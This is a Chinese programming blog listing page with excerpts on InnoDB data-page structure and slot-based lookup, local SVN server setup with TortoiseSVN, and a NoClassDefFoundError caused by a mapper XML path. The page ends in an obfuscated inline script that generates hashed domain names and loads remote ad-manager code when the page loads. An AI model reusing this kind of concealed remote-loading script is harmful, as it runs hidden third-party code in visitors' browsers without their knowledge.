数据库的 I/O 操作的最小单位是页，InnoDB 数据页的默认大小是 16KB，意味着数据库每次读写都是以 16KB 为单位的，一次最少从磁盘中读取 16K 的内容到内存中，一次最少把内存中的 16K 内容刷新到磁盘中。
数据页包括七个部分，结构如下图：
这7个部分的作用如下图：
在 File Header 中有两个指针，分别指向上一个数据页和下一个数据页，连接起来的页相当于一个双向的链表，如下图所示
采用链表的结构是让数据页之间不需要是物理上的连续的，而是逻辑上的连续。
数据页的主要作用是存储记录，也就是数据库的数据，所以重点说一下数据页中的 User Records 是怎么组织数据的。
数据页中的记录按照「主键」顺序组成单向链表，单向链表的特点就是插入、删除非常方便，但是检索效率不高，最差的情况下需要遍历链表上的所有节点才能完成检索。
因此，数据页中有一个页目录，起到记录的索引作用，就像书那样，针对书中内容的每个章节设立了一个目录，想看某个章节的时候，可以查看目录，快速找到对应的章节的页数，而数据页中的页目录就是为了能快速找到记录。
那 InnoDB 是如何给记录创建页目录的呢？页目录与记录的关系如下图：
页目录创建的过程如下：
将所有的记录划分成几个组，这些记录包括最小记录和最大记录，但不包括标记为“已删除”的记录；每个记录组的最后一条记录就是组内最大的那条记录，并且最后一条记录的头信息中会存储该组一共有多少条记录，作为 n_owned 字段（上图中粉红色字段）页目录用来存储每组最后一条记录的地址偏移量，这些地址偏移量会按照先后顺序存储起来，每组的地址偏移量也被称之为槽（slot），每个槽相当于指针指向了不同组的最后一个记录。 从图可以看到，页目录就是由多个槽组成的，槽相当于分组记录的索引。然后，因为记录是按照「主键值」从小到大排序的，所以我们通过槽查找记录时，可以使用二分法快速定位要查询的记录在哪个槽，定位到槽后，再遍历槽内的所有记录，找到对应的记录，无需从最小记录开始遍历整个页中的记录链表。
以上面那张图举个例子，5 个槽的编号分别为 0，1，2，3，4，我想查找主键为 11 的用户记录：
先二分得出槽中间位是 (0+4)/2=2 ，2号槽里最大的记录为 8。因为 11 &gt; 8，所以需要从 2 号槽后继续搜索记录；再使用二分搜索出 3 号和 4 槽的中间位是 (3+4)/2= 3，3 号槽里最大的记录为 12。因为 11 &lt; 12，所以主键为 11 的记录在 3 号槽里；这里有个问题，「槽对应的值都是这个组的主键最大的记录，如何找到组里最小的记录」？比如槽 3 对应最大主键是 12 的记录，那如何找到最小记录 9。解决办法是：通过槽 3 找到 槽 2 对应的记录，也就是主键为 8 的记录。主键为 8 的记录的下一条记录就是槽 3 当中主键最小的 9 记录，然后开始向下搜索 2 次，定位到主键为 11 的记录，取出该条记录的信息即为我们想要查找的内容。 看到第三步的时候，可能有的同学会疑问，如果某个槽内的记录很多，然后因为记录都是单向链表串起来的，那这样在槽内查找某个记录的时间复杂度不就是 O(n) 了吗？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f4d2e62ae5bb664733fb81068b3724c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/520427859a171510e2687aecf1809e23/" rel="bookmark">
			本地搭建svn服务器及TortoiseSVN的基本使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、首先准备三个软件：二、安装及使用1．VisualSVN-Server-5.1.1-x64.msi（svn服务端）一、创建新的存储库二、创建用户Users三、添加一个组—groups四、修改一下项目的配置文件五、本地访问 2. TortoiseSVN-1.10.5.28651-x64-svn-1.10.6.msi使用说明：一、检出二、导入项目三、关于项目的提交：四、新建文件五、删除文件 3. 汉化： LanguagePack_1.10.5.28651-x64-zh_CN.msi（TortoiseSVN 的汉化包） 一、首先准备三个软件： 注意：TortoiseSVN汉化包的版本需要跟TortoiseSVN的版本一致，这里我下错了，找不到相对应的版本就先不用管，我下面有说明
我这里的汉化包版本应该是LanguagePack_1.10.5.28651-x64-zh_CN
软件下载地址：http://subversion.apache.org/packages.html
TortoiseSVN汉化包，跟TortoiseSVN同一个页面，往下翻
二、安装及使用 安装顺序：
1．VisualSVN-Server-5.1.1-x64.msi（svn服务端）
2．TortoiseSVN-1.10.5.28651-x64-svn-1.10.6.msi（svn客户端）
3．LanguagePack_1.10.5.28651-x64-zh_CN.msi（TortoiseSVN 的汉化包）
1．VisualSVN-Server-5.1.1-x64.msi（svn服务端） 根据自己的情况修改配置，不建议勾选https
刚学的同学可以不用管这个，下一步就是了
基本上下一步一步走完就行
一、创建新的存储库 新的存储库名称
创建一个空的存储库
没有看到东西，那是我们还没设置账号和密码
二、创建用户Users 用户，密码，重复密码……
三、添加一个组—groups 选择刚刚添加的users就好
四、修改一下项目的配置文件 \Repositories\这个文件地址在安装时配置过
配置文件在conf下
用记事本打开svnserve.conf
去掉#号和空格
用记事本打开passwd，如下图所示输入，保存
最后配置authz
五、本地访问 复制admin的项目的URL到浏览器打开
之前设置过的，需要授权一下
就好了
以上就是svn服务器安装
2. TortoiseSVN-1.10.5.28651-x64-svn-1.10.6.msi 这个就没什么好说的了，一直next 就行
安装完右键有这两个玩意就行
使用说明： 一、检出 首先创建一个空文件夹。在空文件夹内右键，选择SVN检出。
还是复制admin的项目的URL，这里只是举个例子，也可以使用其他的项目
之前创建的账户，密码……
完成
这里去看会发现多了一个==.svn==的隐藏文件，我这里没有其他多余文件，因为我也没有新建任何文件，这里我们可以再试着新建一个文件夹，然后再update一下
这里我们简单做个示范：
这里就把我们新建的文件拉取下来了，很简单的
二、导入项目 继续新建一个文件夹
还是一如既往的复制admin的项目的URL…
重重叠叠千般意，来来回回还是他
这里就看到了我们之前新建的文件
根据情况来选择，这里我就上传我新建的admin文件夹。
为了不让这个文件夹太单调，或者说不想让他太孤单，我这里加点内容（实际上后面有用）
好的，我们上传到svn的admin文件夹里
确定看到目录完成就行了
但是，不要以为导入成功就可以了。你还得重新检出，重新检出的项目才是受SVN控制的，务必记得检出，如果不检出你操作的属于你没有上传之前的文件，当你下次上传可能会出现问题。
我们回到之前的文件夹，检出
perfect👍
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/520427859a171510e2687aecf1809e23/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d1404ebd299ad8d84497dd823b2c377/" rel="bookmark">
			异常:java.lang.NoClassDefFoundError
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		记一次启动异常排查心路历程
合并代码之后想尝试启动看是否有异常，然后直接报错
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/baomidou/mybatisplus/autoconfigure/MybatisPlusAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.ibatis.session.SqlSessionFactory]: Factory method 'sqlSessionFactory' threw exception; nested exception is java.lang.NoClassDefFoundError: co/yixiang/modules/userInfo/service/dto/UserAssetManageVo (wrong name: co/yixiang/modules/userinfo/service/dto/UserAssetManageVo) 主体大概意思就是在做实例化的过程中发生了嵌套异常了，并把具体嵌套异常的类地址报出来了
就像尾句是这样的：java.lang.NoClassDefFoundError: co/xxx/xxx/xxx/xxx/xxx/类名
那怎么处理呢，我百度大部分都是告诉你通过maven重新clear，install一下或者清除maven库重新去做下载，然而一顿操作并没有什么用
最后排查了很久，通过应用该类的地方一步步找到mapper层，在xml里面找到了原因
其他开发在修改类路径时，没有修改到mapper的xml，导致其中运行时没有加载到该类报错
我真的是！！！！！！！！淦
最后修改xml文件的类路径成功启动
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/213/">«</a>
	<span class="pagination__item pagination__item--current">214/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/215/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>